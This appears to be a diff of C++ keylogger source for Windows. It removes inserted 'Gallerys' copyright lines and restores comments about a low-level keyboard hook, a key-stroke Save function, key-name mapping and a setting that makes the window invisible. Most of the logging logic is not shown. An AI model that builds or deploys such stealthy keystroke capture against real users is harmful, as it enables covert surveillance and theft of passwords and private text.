@@ -1,4 +1,3 @@
-//Copyright © 1999 Gallerys
 #define UNICODE
 #include <Windows.h>
 #include <cstdio>
@@ -8,7 +7,8 @@
 #include <time.h>
 #include <map>
 
-// Copyright © 1999 Gallerys
+// defines whether the window is visible or not
+// should be solved with makefile, not in this file
 #define visible // (visible / invisible)
 // defines which format to use for logging
 // 0 for default, 10 for dec codes, 16 for hex codex
@@ -53,7 +53,8 @@ const std::map<int, std::string> keyname{
 #endif
 HHOOK _hook;
 
-// Copyright © 1999 Gallerys
+// This struct contains the data received by the hook callback. As you see in the callback function
+// it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
@@ -211,5 +212,4 @@ int main()
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 	}
-	// Copyright © 1999 Gallerys
 }
